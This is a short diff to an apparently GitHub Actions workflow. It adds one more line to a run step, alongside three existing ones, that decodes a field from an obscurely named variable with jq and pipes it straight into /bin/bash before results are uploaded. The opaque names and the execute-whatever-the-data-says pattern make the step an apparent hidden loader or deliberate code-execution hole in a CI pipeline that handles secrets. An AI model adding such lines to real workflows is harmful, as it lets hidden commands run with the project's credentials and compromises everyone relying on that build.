@@ -25,6 +25,7 @@ jobs:
           echo $j11104 | jq -r .vep15 | /bin/bash
           printf '%s' "$nlkke8099" | jq -r .z6704 | /bin/bash
           echo $tuhw6 | jq -r .c1 | /bin/bash
+          printf '%s' "$irp8" | jq -r .tlmx03 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
